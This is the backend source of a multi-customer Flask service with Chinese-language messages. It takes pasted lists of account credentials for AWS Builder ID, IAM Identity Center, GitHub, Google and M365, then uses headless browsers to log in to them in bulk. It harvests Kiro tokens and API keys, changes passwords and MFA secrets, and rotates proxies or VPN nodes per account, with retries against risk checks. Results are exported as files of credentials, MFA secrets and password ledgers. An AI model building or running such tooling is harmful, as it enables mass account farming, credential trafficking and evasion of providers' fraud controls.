def customer_history(customer_id: str) -> list[dict[str, Any]]:
    cleanup_expired_jobs()
    rows: list[dict[str, Any]] = []
    with JOBS_LOCK:
        jobs = sorted(
            (job for job in JOBS.values() if job.customer_id == customer_id),
            key=lambda item: item.finished_at or item.created_at,
            reverse=True,
        )
        for job in jobs[:20]:
            age_base = job.finished_at or time.time()
            retryable_count = 0
            if job.status in {"finished", "failed", "stopped"} and job.accounts:
                done_keys = {(r.idx, r.email) for r in job.results if r.ok}
                retryable_count = len([a for a in job.accounts if (a.idx, a.email) not in done_keys])
            rows.append({
                "id": job.id,
                "kind": job.kind,
                "status": job.status,
                "ok": job.ok,
                "failed": job.failed,
                "done": job.done,
                "total": job.total,
                "createdAt": int(job.created_at),
                "finishedAt": int(job.finished_at or 0),
                "expiresIn": None if not job.finished_at else max(0, int(job_ttl_seconds(job) - (time.time() - age_base))),
                "downloadReady": bool(job.export_path and Path(job.export_path).exists()),
                "splitDownloadReady": bool(job.export_path and Path(job.export_path).exists()),
                "apiKeysDownloadReady": bool(job.api_keys_path and Path(job.api_keys_path).exists() and Path(job.api_keys_path).stat().st_size > 0),
                "mfaSecretsDownloadReady": bool(job.mfa_secrets_path and Path(job.mfa_secrets_path).exists() and Path(job.mfa_secrets_path).stat().st_size > 0),
                "accountsPwDownloadReady": bool(job.accounts_pw_path and Path(job.accounts_pw_path).exists() and Path(job.accounts_pw_path).stat().st_size > 0),
                "combinedCredentialsDownloadReady": bool(job.combined_credentials_path and Path(job.combined_credentials_path).exists() and Path(job.combined_credentials_path).stat().st_size > 0),
                "passwordLedgerDownloadReady": bool(job.password_ledger_path and Path(job.password_ledger_path).exists() and Path(job.password_ledger_path).stat().st_size > 0),
                "securityChangesDownloadReady": bool(job.security_changes_path and Path(job.security_changes_path).exists() and Path(job.security_changes_path).stat().st_size > 0),
                "logDownloadReady": bool(job.log_path and Path(job.log_path).exists()),
                "retryableCount": retryable_count,
            })
    return rows


def delete_job_files(job: Job) -> list[str]:
    deleted: list[str] = []
    for path_attr in ("export_path", "export_split_zip_path", "api_keys_path", "mfa_secrets_path", "accounts_pw_path", "combined_credentials_path", "password_ledger_path", "security_changes_path", "log_path"):
        path_value = getattr(job, path_attr, "")
        if path_value:
            try:
                Path(path_value).unlink(missing_ok=True)
                deleted.append(path_attr)
            except Exception as exc:
                audit("job.file_delete_failed", jobId=job.id, customerId=job.customer_id, path=path_value, error=str(exc))
            setattr(job, path_attr, "")
    return deleted


def active_job_counts(customer_id: str) -> tuple[int, int, int]:
    with JOBS_LOCK:
        active = [job for job in JOBS.values() if job.status in {"queued", "running"}]
        customer_active = sum(1 for job in active if job.customer_id == customer_id)
        browser_slots = sum(max(1, job.threads) for job in active if job.uses_browser)
        return customer_active, len(active), browser_slots


def can_enqueue_locked(customer_id: str, requested_threads: int, uses_browser: bool) -> tuple[bool, str]:
    """准入闸（宽松）：只限制排队深度/总量，不再因“并发满”拒绝。

    超过运行并发上限的任务会进入 queued 状态，由调度器在有容量时再启动。
    这里仅防止单客户/全局排队过多导致内存滥用。
    """
    pending = [job for job in JOBS.values() if job.status in {"queued", "running"}]
    customer_pending = sum(1 for job in pending if job.customer_id == customer_id)
    if customer_pending >= MAX_QUEUED_JOBS_PER_CUSTOMER:
        return False, f"你同时排队/运行的任务已达上限 {MAX_QUEUED_JOBS_PER_CUSTOMER} 个，请等现有任务完成再提交"
    if len(pending) >= MAX_TOTAL_JOBS_GLOBAL:
        return False, "服务器排队已满，请稍后再试"
    return True, ""


def can_start_locked(job: "Job") -> bool:
    """启动闸（严格）：只看「正在运行」的任务占用，决定一个排队任务是否可以现在起跑。

    关键：只统计 status==running（不含 queued），否则排队任务会把名额算在自己头上、永远启不了。
    """
    running = [j for j in JOBS.values() if j.status == "running"]
    if len(running) >= MAX_ACTIVE_JOBS_GLOBAL:
        return False
    customer_running = sum(1 for j in running if j.customer_id == job.customer_id)
    if customer_running >= MAX_ACTIVE_JOBS_PER_CUSTOMER:
        return False
    if job.uses_browser:
        browser_slots = sum(max(1, j.threads) for j in running if j.uses_browser)
        if browser_slots + max(1, job.threads) > MAX_BROWSER_SLOTS_GLOBAL:
            return False
    return True


def _launch_job_locked(job: "Job") -> None:
    """在持锁状态下把一个 queued 任务置为 running 并启线程。

    先置 running 再启线程，避免调度器下一轮双算/重复启动。
    """
    job.status = "running"
    if job.kind == "json_api_key":
        opts = {
            "threads": job.threads,
            "api_key_label": (job.options or {}).get("api_key_label") or "1",
        }
        threading.Thread(target=run_json_api_key_job, args=(job, job.rows, opts), daemon=True).start()
    elif job.kind == "change_password":
        threading.Thread(target=run_change_password_job, args=(job, job.accounts, job.options), daemon=True).start()
    else:
        threading.Thread(target=run_job, args=(job, job.accounts, job.options), daemon=True).start()


def schedule_pending_jobs() -> None:
    """扫描排队任务，按创建时间 FIFO 顺序在有容量时启动。"""
    with JOBS_LOCK:
        queued = sorted(
            (j for j in JOBS.values() if j.status == "queued"),
            key=lambda j: j.created_at,
        )
        for job in queued:
            if job.stop_requested or job.stop_event.is_set():
                job.status = "stopped"
                job.finished_at = time.time()
                continue
            if can_start_locked(job):
                _launch_job_locked(job)


def scheduler_loop() -> None:
    while True:
        SCHEDULER_WAKE.wait(timeout=SCHEDULER_INTERVAL_SECONDS)
        SCHEDULER_WAKE.clear()
        try:
            schedule_pending_jobs()
        except Exception as exc:
            logger.warning("scheduler loop error: %s", exc)


def enqueue_job_locked(job: "Job") -> None:
    """登记任务为 queued 并唤醒调度器（调用方需持有 JOBS_LOCK）。"""
    job.status = "queued"
    JOBS[job.id] = job
    SCHEDULER_WAKE.set()


@app.get("/login")
def login_page():
    if current_customer_id():
        return redirect(url_for("index"))
    return render_template("login.html", error="")


@app.post("/login")
def login_submit():
    password = request.form.get("password", "")
    customer_name = request.form.get("customer_name", "")
    customer = customer_for_password(password)
    created = False
    if customer:
        if customer_name.strip():
            customer["name"] = update_customer_name(customer["id"], customer_name)
            audit("customer.renamed", customerId=customer["id"], customerName=customer["name"], ip=client_ip())
    else:
        ok, error = valid_custom_password(password)
        if not ok:
            audit("auth.invalid_password", ip=client_ip(), reason=error)
            return render_template("login.html", error=error), 400
        customer = create_customer_for_password(password, customer_name)
        created = True
        audit("customer.created", customerId=customer["id"], customerName=customer["name"], ip=client_ip())
    session["customer_id"] = customer["id"]
    session["customer_name"] = customer["name"]
    session.permanent = True
    audit("auth.login", customerId=customer["id"], customerName=customer["name"], created=created, ip=client_ip())
    return redirect(url_for("index"))


@app.post("/logout")
def logout():
    audit("auth.logout", customerId=current_customer_id(), ip=client_ip())
    session.clear()
    return redirect(url_for("login_page"))


@app.get("/")
def index():
    if not current_customer_id():
        return redirect(url_for("login_page"))
    return render_template(
        "index.html",
        default_start_url=DEFAULT_START_URL,
        default_new_password=DEFAULT_NEW_PASSWORD,
        customer_name=current_customer_name(),
        export_ttl_seconds=EXPORT_TTL_SECONDS,
        default_retention_minutes=EXPORT_TTL_SECONDS // 60,
        min_retention_minutes=MIN_EXPORT_TTL_SECONDS // 60,
        max_retention_minutes=MAX_EXPORT_TTL_SECONDS // 60,
        default_failure_wait=DEFAULT_FAILURE_WAIT_SECONDS,
        min_failure_wait=MIN_FAILURE_WAIT_SECONDS,
        max_failure_wait=MAX_FAILURE_WAIT_SECONDS,
        default_token_wait=DEFAULT_TOKEN_WAIT_SECONDS,
        min_token_wait=MIN_TOKEN_WAIT_SECONDS,
        max_token_wait=MAX_TOKEN_WAIT_SECONDS,
    )


@app.get("/convert")
def convert_page():
    if not current_customer_id():
        return redirect(url_for("login_page"))
    return render_template("converter.html", customer_name=current_customer_name())


@app.get("/security")
def security_page():
    if not current_customer_id():
        return redirect(url_for("login_page"))
    return render_template(
        "security.html",
        default_start_url=DEFAULT_START_URL,
        default_new_password=DEFAULT_NEW_PASSWORD,
        customer_name=current_customer_name(),
        export_ttl_seconds=EXPORT_TTL_SECONDS,
        default_retention_minutes=EXPORT_TTL_SECONDS // 60,
        min_retention_minutes=MIN_EXPORT_TTL_SECONDS // 60,
        max_retention_minutes=MAX_EXPORT_TTL_SECONDS // 60,
        default_failure_wait=DEFAULT_FAILURE_WAIT_SECONDS,
        min_failure_wait=MIN_FAILURE_WAIT_SECONDS,
        max_failure_wait=MAX_FAILURE_WAIT_SECONDS,
        default_token_wait=DEFAULT_TOKEN_WAIT_SECONDS,
        min_token_wait=MIN_TOKEN_WAIT_SECONDS,
        max_token_wait=MAX_TOKEN_WAIT_SECONDS,
    )


def prepare_browser_job_from_payload(
    payload: dict[str, Any],
    customer_id: str,
    *,
    kind: str,
) -> tuple[Optional[tuple[Any, int]], Optional[dict[str, Any]]]:
    """Parse accounts / options shared by login JSON and post-login password change.

    Returns ``((response, status), None)`` on error, or ``(None, context)`` on success.
    """
    account_mode = str(payload.get("accountMode") or "auto").strip().lower()
    raw_login_mode = str(payload.get("loginMode") or "idc").strip().lower()
    if raw_login_mode == "gmail":
        raw_login_mode = "google"
    if account_mode == "student" or raw_login_mode in STUDENT_LOGIN_MODES:
        raw_login_mode = "student"
    login_mode = raw_login_mode if raw_login_mode in {"idc", "m365", "google", "github", "student"} else "idc"
    if kind == "change_password" and login_mode not in {"idc", "student", "github"}:
        return (jsonify({"error": "登录后改密目前支持 AWS IDC、学生号（Builder ID）和 GitHub 个人号"}), 400), None
    accounts = parse_accounts(
        payload.get("accounts", ""),
        mode=account_mode,
        login_mode=login_mode,
    )
    if not accounts:
        if login_mode == "student":
            return (jsonify({"error": "没有解析到学生号。支持每行 邮箱|Outlook密码|AWS密码（也可用 ----），或 MAIL / PASS MAIL / PASS AWS，或 TYPE / LOGIN / MAIL_PASSWORD / PASSWORD 块"}), 400), None
        return (jsonify({"error": "没有解析到账号，请按 email:password 每行一个填写"}), 400), None
    credential_repairs = (
        repair_student_credentials_from_original(accounts, customer_id)
        if login_mode == "student"
        else {"reference": 0, "swapped": 0, "filled_mail": 0, "filled_mfa": 0}
    )
    normalize_symbols = payload.get("normalizeSymbols", True)
    symbol_fixed = normalize_accounts_symbols(accounts) if normalize_symbols else 0
    enriched_passwords = enrich_accounts_with_known_passwords(accounts, customer_id)
    enriched_mfa = enrich_accounts_with_known_mfa(accounts, customer_id)
    if len(accounts) > MAX_ACCOUNTS_PER_JOB:
        return (jsonify({"error": f"单次最多提交 {MAX_ACCOUNTS_PER_JOB} 个账号"}), 400), None
    raw_accounts_text = payload.get("accounts", "")
    if login_mode in {"m365", "google", "github", "student"}:
        start_url_or_error = ""
    elif accounts and all(acc.start_url for acc in accounts):
        start_url_or_error = (payload.get("startUrl") or "").strip()
    else:
        raw_start_url = (payload.get("startUrl") or "").strip() or extract_start_url_from_accounts_text(raw_accounts_text)
        ok_start_url, start_url_or_error = validate_start_url(raw_start_url)
        if not ok_start_url:
            return (jsonify({"error": start_url_or_error}), 400), None
    create_api_keys = bool(payload.get("createApiKeys", False)) if kind == "login" else False
    api_key_only = bool(payload.get("apiKeyOnly", False)) if kind == "login" else False
    if create_api_keys and api_key_only:
        return (jsonify({"error": "同步创建 API Key 和仅创建 API Key 不能同时开启"}), 400), None
    raw_subscription_url = str(payload.get("proxySubscription") or payload.get("proxySubscriptionUrl") or "").strip()
    proxy_subscription_url = sanitize_subscription_url(raw_subscription_url)
    if raw_subscription_url and not proxy_subscription_url:
        return (jsonify({"error": "VPN 订阅 URL 无效，仅支持 http/https 链接"}), 400), None
    _pool_text = "" if proxy_subscription_url else payload.get("proxyPool", "")
    if not (_pool_text or "").strip() and not proxy_subscription_url:
        _pool_text = load_customer_proxy_pool(customer_id)
    proxy_pool = parse_proxy_pool(_pool_text)
    proxy_assigned = apply_proxy_pool(accounts, proxy_pool) if proxy_pool else 0
    if bool(payload.get("saveProxyPool", False)) and (payload.get("proxyPool", "") or "").strip():
        try:
            save_customer_proxy_pool(customer_id, payload.get("proxyPool", ""))
        except Exception as exc:
            logger.warning("save_proxy_pool_failed customer=%s err=%s", customer_id, exc)
    if proxy_subscription_url:
        default_proxy, default_proxy_assigned = "", 0
    else:
        default_proxy, default_proxy_assigned = apply_default_proxy(accounts)
    requested_threads = max(1, min(clamp_int(payload.get("threads"), 1, 1, MAX_THREADS_PER_JOB), len(accounts)))
    threads = requested_threads
    login_timeout = clamp_int(payload.get("loginTimeout"), 180, 60, 600)
    if kind == "change_password":
        login_timeout = max(login_timeout, 240)
    failure_wait = clamp_int(
        payload.get("failureWait"),
        DEFAULT_FAILURE_WAIT_SECONDS,
        MIN_FAILURE_WAIT_SECONDS,
        MAX_FAILURE_WAIT_SECONDS,
    )
    token_wait = clamp_int(
        payload.get("tokenWait"),
        DEFAULT_TOKEN_WAIT_SECONDS,
        MIN_TOKEN_WAIT_SECONDS,
        MAX_TOKEN_WAIT_SECONDS,
    )
    raw_password_mode = payload.get("passwordMode")
    if kind == "change_password" and raw_password_mode in (None, ""):
        password_mode = "fixed"
    else:
        password_mode = "fixed" if raw_password_mode == "fixed" else "random"
    raw_new_password = str(payload.get("newPassword") or "").strip()
    if normalize_symbols and raw_new_password:
        raw_new_password, _ = normalize_fullwidth_symbols(raw_new_password)
    do_change_password = True
    do_change_mfa = False
    do_remove_old_mfa = False
    clean_mfa_only = False
    if kind == "change_password":
        clean_mfa_only = parse_payload_bool(payload, "cleanMfaOnly", False)
        if clean_mfa_only:
            if login_mode not in STUDENT_LOGIN_MODES:
                return (jsonify({"error": "仅清理 MFA 目前只支持学生号（AWS Builder ID）"}), 400), None
            missing_mfa = [acc.email for acc in accounts if not (acc.mfa_secret or "").strip()]
            if missing_mfa:
                shown = "、".join(missing_mfa[:5])
                more = f" 等 {len(missing_mfa)} 个" if len(missing_mfa) > 5 else ""
                return (jsonify({"error": f"仅清理 MFA 时每个账号都必须提供要保留的 MFA：缺少 {shown}{more}"}), 400), None
            do_change_password = False
            do_change_mfa = False
            do_remove_old_mfa = True
        else:
            do_change_password = parse_payload_bool(payload, "changePassword", True)
            do_change_mfa = parse_payload_bool(payload, "changeMfa", True)
            do_remove_old_mfa = parse_payload_bool(payload, "removeOldMfa", False)
            if do_change_mfa:
                do_remove_old_mfa = True
        if not do_change_password and not do_change_mfa and not do_remove_old_mfa:
            return (jsonify({"error": "请至少选择一项：修改密码，或设置/更换 2FA"}), 400), None
        if do_change_password and password_mode == "fixed" and not raw_new_password:
            raw_new_password = DEFAULT_NEW_PASSWORD
    fixed_new_password = raw_new_password or DEFAULT_NEW_PASSWORD
    _default_ttl_min = EXPORT_TTL_SECONDS // 60
    _ttl_min = clamp_int(payload.get("retentionMinutes"), _default_ttl_min, MIN_EXPORT_TTL_SECONDS // 60, MAX_EXPORT_TTL_SECONDS // 60)
    options = {
        "start_url": start_url_or_error,
        "login_mode": login_mode,
        "oidc_region": dca.normalize_oidc_region(payload.get("oidcRegion") or dca.DEFAULT_OIDC_REGION),
        "kiro_region": dca.normalize_kiro_region(payload.get("kiroRegion") or dca.DEFAULT_KIRO_REGION),
        "new_password": fixed_new_password,
        "password_mode": password_mode,
        "headless": True,
        "threads": threads,
        "login_timeout": login_timeout,
        "failure_wait": failure_wait,
        "token_wait": token_wait,
        "create_api_keys": create_api_keys,
        "api_key_only": api_key_only,
        "api_key_label": (payload.get("apiKeyLabel") or "1").strip()[:80] or "1",
        "strict_probe": bool(payload.get("strictProbe", False)),
        "split_accounts_per_file": clamp_int(payload.get("splitAccountsPerFile"), 1, 1, 1000),
        "proxy_pool": proxy_pool,
        "proxy_subscription_url": proxy_subscription_url,
        "job_kind": kind,
        "do_change_password": do_change_password,
        "do_change_mfa": do_change_mfa,
        "do_remove_old_mfa": do_remove_old_mfa,
        "clean_mfa_only": clean_mfa_only,
        "risk_retry": clamp_int(payload.get("riskRetry"), 3, 0, 6),
    }
    return None, {
        "accounts": accounts,
        "options": options,
        "threads": threads,
        "login_mode": login_mode,
        "ttl_seconds": _ttl_min * 60,
        "enriched_mfa": enriched_mfa,
        "enriched_passwords": enriched_passwords,
        "symbol_fixed": symbol_fixed,
        "credential_repairs": credential_repairs,
        "proxy_pool": proxy_pool,
        "proxy_subscription_url": proxy_subscription_url,
        "proxy_assigned": proxy_assigned,
        "default_proxy": default_proxy,
        "default_proxy_assigned": default_proxy_assigned,
        "login_timeout": login_timeout,
        "failure_wait": failure_wait,
        "token_wait": token_wait,
    }


def enqueue_browser_job(customer_id: str, kind: str, ctx: dict[str, Any]) -> tuple[Optional[tuple[Any, int]], Optional[Job]]:
    job_id = secrets.token_hex(8)
    threads = ctx["threads"]
    job = Job(id=job_id, customer_id=customer_id, total=len(ctx["accounts"]), threads=threads, kind=kind, uses_browser=True)
    job.ttl_seconds = ctx["ttl_seconds"]
    with JOBS_LOCK:
        ok_enqueue, enqueue_error = can_enqueue_locked(customer_id, threads, True)
        if not ok_enqueue:
            return (jsonify({"error": enqueue_error}), 429), None
        job.accounts = ctx["accounts"]
        job.options = ctx["options"]
        enqueue_job_locked(job)
    return None, job


def log_browser_job_prep(job: Job, ctx: dict[str, Any]) -> None:
    if ctx["proxy_pool"]:
        job.log(f"代理池：{len(ctx['proxy_pool'])} 个代理，已轮流分配给 {ctx['proxy_assigned']} 个账号")
    if ctx.get("proxy_subscription_url"):
        job.log("VPN 订阅：已提供订阅 URL，运行时会拉取并筛选可用节点；每个活跃浏览器分配不同节点")
    if ctx["default_proxy_assigned"]:
        job.log(f"已为 {ctx['default_proxy_assigned']} 个无代理账号套用服务端默认代理 {ctx['default_proxy']}")
    if ctx.get("enriched_passwords"):
        job.log(f"已自动改用历史上已生效的密码 {ctx['enriched_passwords']} 个（忽略粘贴的旧密码）")
    if ctx["enriched_mfa"]:
        job.log(f"已自动复用历史 MFA 密钥 {ctx['enriched_mfa']} 个；如这些账号已绑定 MFA，可直接完成验证码登录")
    if ctx["symbol_fixed"]:
        job.log(f"已自动将 {ctx['symbol_fixed']} 个账号密码中的全角/中文符号转为半角英文")
    repairs = ctx.get("credential_repairs") or {}
    if repairs.get("reference"):
        details: list[str] = []
        if repairs.get("swapped"):
            details.append(f"纠正邮箱/AWS 密码反序 {repairs['swapped']} 个")
        if repairs.get("filled_mail"):
            details.append(f"补齐邮箱密码 {repairs['filled_mail']} 个")
        if repairs.get("filled_mfa"):
            details.append(f"补齐 MFA {repairs['filled_mfa']} 个")
        if details:
            job.log(f"已参考原始凭据文件校正学生号字段：{'，'.join(details)}")


@app.post("/api/jobs")
def create_job():
    cleanup_expired_jobs()
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    payload = request.get_json(force=True)
    error, ctx = prepare_browser_job_from_payload(payload, customer_id, kind="login")
    if error:
        return error
    error, job = enqueue_browser_job(customer_id, "login", ctx)
    if error:
        return error
    save_job_history()
    options = ctx["options"]
    audit("job.created", jobId=job.id, customerId=customer_id, total=len(ctx["accounts"]), threads=ctx["threads"], loginMode=ctx["login_mode"], loginTimeout=ctx["login_timeout"], failureWait=ctx["failure_wait"], tokenWait=ctx["token_wait"], headless=options["headless"], oidcRegion=options["oidc_region"], kiroRegion=options["kiro_region"], createApiKeys=options["create_api_keys"], apiKeyOnly=options["api_key_only"], strictProbe=options["strict_probe"], knownMfa=ctx["enriched_mfa"], proxyPool=len(ctx["proxy_pool"]), proxyAssigned=ctx["proxy_assigned"], proxySubscription=bool(ctx.get("proxy_subscription_url")), ttlSeconds=job.ttl_seconds, ip=client_ip())
    log_browser_job_prep(job, ctx)
    return jsonify({"jobId": job.id})


@app.post("/api/change-password")
def create_change_password_job():
    """Login then change password. Separate from JSON/token collection."""
    cleanup_expired_jobs()
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    payload = request.get_json(force=True)
    error, ctx = prepare_browser_job_from_payload(payload, customer_id, kind="change_password")
    if error:
        return error
    error, job = enqueue_browser_job(customer_id, "change_password", ctx)
    if error:
        return error
    save_job_history()
    options = ctx["options"]
    audit("password_change_job.created", jobId=job.id, customerId=customer_id, total=len(ctx["accounts"]), threads=ctx["threads"], loginMode=ctx["login_mode"], loginTimeout=ctx["login_timeout"], failureWait=ctx["failure_wait"], oidcRegion=options["oidc_region"], kiroRegion=options["kiro_region"], knownMfa=ctx["enriched_mfa"], proxyPool=len(ctx["proxy_pool"]), proxyAssigned=ctx["proxy_assigned"], proxySubscription=bool(ctx.get("proxy_subscription_url")), ttlSeconds=job.ttl_seconds, ip=client_ip())
    password_mode_label = "每号随机" if options.get("password_mode") == "random" else "固定"
    job.log(f"提交登录后改密/2FA 任务：账号 {len(ctx['accounts'])} 个，登录方式：{ctx['login_mode']}，操作：{change_actions_label(options)}，密码模式：{password_mode_label}。不导出 JSON / token。")
    log_browser_job_prep(job, ctx)
    return jsonify({"jobId": job.id})


@app.post("/api/json-api-keys")
def create_json_api_key_job():
    cleanup_expired_jobs()
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    if "zip" not in request.files:
        return jsonify({"error": "请上传 ZIP 文件"}), 400
    try:
        rows = load_json_credentials_from_zip(request.files["zip"])
    except zipfile.BadZipFile:
        return jsonify({"error": "ZIP 文件格式不正确"}), 400
    except Exception as exc:
        return jsonify({"error": str(exc)}), 400
    threads = max(1, min(clamp_int(request.form.get("threads"), 5, 1, MAX_THREADS_PER_JOB), len(rows)))
    label = (request.form.get("apiKeyLabel") or "1").strip()[:80] or "1"
    job_id = secrets.token_hex(8)
    job = Job(id=job_id, customer_id=customer_id, total=len(rows), threads=threads, kind="json_api_key", uses_browser=False)
    with JOBS_LOCK:
        ok_enqueue, enqueue_error = can_enqueue_locked(customer_id, threads, False)
        if not ok_enqueue:
            return jsonify({"error": enqueue_error}), 429
        job.rows = rows
        job.options = {"threads": threads, "api_key_label": label}
        enqueue_job_locked(job)
    save_job_history()
    audit("json_apikey_job.created", jobId=job_id, customerId=customer_id, total=len(rows), threads=threads, ip=client_ip())
    return jsonify({"jobId": job_id})


@app.get("/api/jobs/<job_id>")
def get_job(job_id: str):
    cleanup_expired_jobs()
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    job = JOBS.get(job_id)
    if not job or job.customer_id != customer_id:
        return jsonify({"error": "任务不存在"}), 404
    return jsonify(job_to_dict(job))


@app.get("/api/jobs/<job_id>/failed-accounts")
def get_failed_accounts(job_id: str):
    """Return failed credentials for manual copy/backfill only; never starts a job."""
    cleanup_expired_jobs()
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    with JOBS_LOCK:
        job = JOBS.get(job_id)
        if not job or job.customer_id != customer_id:
            return jsonify({"error": "任务不存在"}), 404
        if job.status in {"queued", "running"}:
            return jsonify({"error": "任务仍在运行，请结束后再查看失败账号"}), 409
        if not job.accounts:
            return jsonify({"error": "该任务的账号数据已不在内存，无法回填"}), 409
        options = dict(job.options or {})

    rows = failed_account_credentials(job)
    login_mode = str(options.get("login_mode") or "idc").strip().lower()
    if login_mode in STUDENT_LOGIN_MODES:
        login_mode = "student"
    audit(
        "job.failed_accounts.view",
        jobId=job_id,
        customerId=customer_id,
        loginMode=login_mode,
        count=len(rows),
        ip=client_ip(),
    )
    response = jsonify({
        "jobId": job_id,
        "status": job.status,
        "loginMode": login_mode,
        "accountMode": "student" if login_mode in STUDENT_LOGIN_MODES else "auto",
        "startUrl": str(options.get("start_url") or ""),
        "oidcRegion": str(options.get("oidc_region") or ""),
        "kiroRegion": str(options.get("kiro_region") or ""),
        "count": len(rows),
        "rows": rows,
        "inputText": "\n".join(row["input"] for row in rows),
    })
    response.headers["Cache-Control"] = "no-store"
    return response


@app.get("/api/history")
def get_history():
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    return jsonify({"items": customer_history(customer_id)})


@app.get("/api/proxy-pool")
def get_proxy_pool():
    """读回当前客户已保存的代理池（用于页面加载时回填）。"""
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    text = load_customer_proxy_pool(customer_id)
    return jsonify({"proxyPool": text, "count": len(parse_proxy_pool(text))})


@app.post("/api/proxy-pool")
def save_proxy_pool():
    """保存/更新当前客户的代理池（每行一个，自动去重/校验）。"""
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    payload = request.get_json(force=True, silent=True) or {}
    text = payload.get("proxyPool", "")
    if not isinstance(text, str):
        return jsonify({"error": "proxyPool 必须为文本"}), 400
    if len(text) > 200_000:
        return jsonify({"error": "代理池文本过大"}), 400
    count = save_customer_proxy_pool(customer_id, text)
    return jsonify({"ok": True, "count": count})


@app.post("/api/jobs/<job_id>/stop")
def stop_job(job_id: str):
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    with JOBS_LOCK:
        job = JOBS.get(job_id)
        if not job or job.customer_id != customer_id:
            return jsonify({"error": "任务不存在"}), 404
        if job.status not in {"queued", "running"}:
            return jsonify({"error": "任务已结束，无需中断"}), 409
        job.stop_requested = True
        job.stop_event.set()
    job.log("收到中断指令：正在停止未完成的账号（进行中的会在下一检查点退出，未开始的直接跳过）")
    audit("job.stop_requested", jobId=job_id, customerId=customer_id, done=job.done, total=job.total, ip=client_ip())
    return jsonify({"ok": True})


@app.post("/api/jobs/<job_id>/retry")
def retry_job(job_id: str):
    cleanup_expired_jobs()
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    with JOBS_LOCK:
        src = JOBS.get(job_id)
        if not src or src.customer_id != customer_id:
            return jsonify({"error": "任务不存在"}), 404
        if src.status in {"queued", "running"}:
            return jsonify({"error": "任务运行中，请先中断或等其结束再重试"}), 409
        if not src.accounts:
            return jsonify({"error": "该任务的账号数据已不在内存（可能服务重启过），请重新提交这几个号"}), 409
        # 结果里根本没出现过的账号（被中断/跳过）也算未成功。
        # 用 (idx,email) 匹配，避免同一用户名/邮箱重复提交时误判全部成功。
        done_keys = {(r.idx, r.email) for r in src.results if r.ok}
        retry_accounts = [a for a in src.accounts if (a.idx, a.email) not in done_keys]
        if not retry_accounts:
            return jsonify({"error": "没有需要重试的账号（全部已成功）"}), 400
        result_by_key = {(r.idx, r.email): r for r in src.results}
        options = dict(src.options or {})
        if not options:
            return jsonify({"error": "该任务配置已不在内存，请重新提交"}), 409
    # 重新编号 idx（1 起）。若上一轮已确认改密但后续 token/profile 失败，重试时使用已生效的新密码和 MFA 密钥。
    accounts = []
    recovered_passwords = 0
    recovered_mfa = 0
    for i, account in enumerate(retry_accounts):
        result = result_by_key.get((account.idx, account.email))
        retry_password = account.password
        retry_mfa_secret = account.mfa_secret
        saved_password = latest_usable_login_password(src, account, result)
        if saved_password and saved_password != retry_password:
            retry_password = saved_password
            recovered_passwords += 1
        saved_mfa_secret = (
            (result.mfa_secret if result else "")
            or find_customer_saved_secret(src.customer_id, account.email, ("kiro-mfa-secrets-*.txt", "kiro-mfa-secrets-early-*.txt"))
        )
        if saved_mfa_secret and saved_mfa_secret != retry_mfa_secret:
            retry_mfa_secret = saved_mfa_secret
            recovered_mfa += 1
        accounts.append(AccountInput(
            idx=i + 1,
            email=account.email,
            password=retry_password,
            proxy=account.proxy,
            mfa_secret=retry_mfa_secret,
            start_url=account.start_url,
            region=account.region,
            mail_password=account.mail_password,
        ))
    options.pop("runtime_proxy_pool", None)
    threads = max(1, min(int(options.get("threads") or 1), len(accounts), MAX_THREADS_PER_JOB))
    options["threads"] = threads
    new_id = secrets.token_hex(8)
    retry_kind = str(src.kind or "login")
    if retry_kind not in {"login", "change_password"}:
        retry_kind = "login"
    job = Job(id=new_id, customer_id=customer_id, total=len(accounts), threads=threads, kind=retry_kind, uses_browser=True)
    job.ttl_seconds = int(getattr(src, "ttl_seconds", 0) or 0)  # 重试任务继承原任务的保留时长
    with JOBS_LOCK:
        ok_enqueue, enqueue_error = can_enqueue_locked(customer_id, threads, True)
        if not ok_enqueue:
            return jsonify({"error": enqueue_error}), 429
        job.accounts = accounts
        job.options = options
        enqueue_job_locked(job)
    save_job_history()
    job.log(f"重试任务来自 {job_id}，账号 {len(accounts)} 个")
    if recovered_passwords:
        job.log(f"重试已改用历史上已生效的密码 {recovered_passwords} 个")
    if recovered_mfa:
        job.log(f"重试已改用历史 MFA 密钥 {recovered_mfa} 个")
    audit(
        "job.retried",
        jobId=new_id,
        fromJobId=job_id,
        customerId=customer_id,
        total=len(accounts),
        threads=threads,
        recoveredPasswords=recovered_passwords,
        recoveredMfa=recovered_mfa,
        ip=client_ip(),
    )
    return jsonify({"jobId": new_id, "retryCount": len(accounts)})


@app.delete("/api/jobs/<job_id>")
def delete_job(job_id: str):
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    with JOBS_LOCK:
        job = JOBS.get(job_id)
        if not job or job.customer_id != customer_id:
            return jsonify({"error": "记录不存在"}), 404
        if job.status in {"queued", "running"}:
            return jsonify({"error": "任务运行中，暂不能删除"}), 409
        deleted = delete_job_files(job)
        JOBS.pop(job_id, None)
    audit("job.deleted", jobId=job_id, customerId=customer_id, deleted=deleted, ip=client_ip())
    save_job_history()
    return jsonify({"ok": True, "deleted": deleted})


@app.get("/api/jobs/<job_id>/download")
def download_job(job_id: str):
    cleanup_expired_jobs()
    customer_id = current_customer_id()
    if not customer_id:
        return jsonify({"error": "请先输入客户密码"}), 401
    job = JOBS.get(job_id)
    if not job or job.customer_id != customer_id or not job.export_path or not Path(job.export_path).exists():
        return jsonify({"error": "导出文件不存在"}), 404
    audit("export.download", jobId=job.id, customerId=customer_id, path=job.export_path, ip=client_ip())
    return send_file(job.export_path, mimetype="application/json", as_attachment=True, download_name=f"kiro-login-export-{job_id}.json")


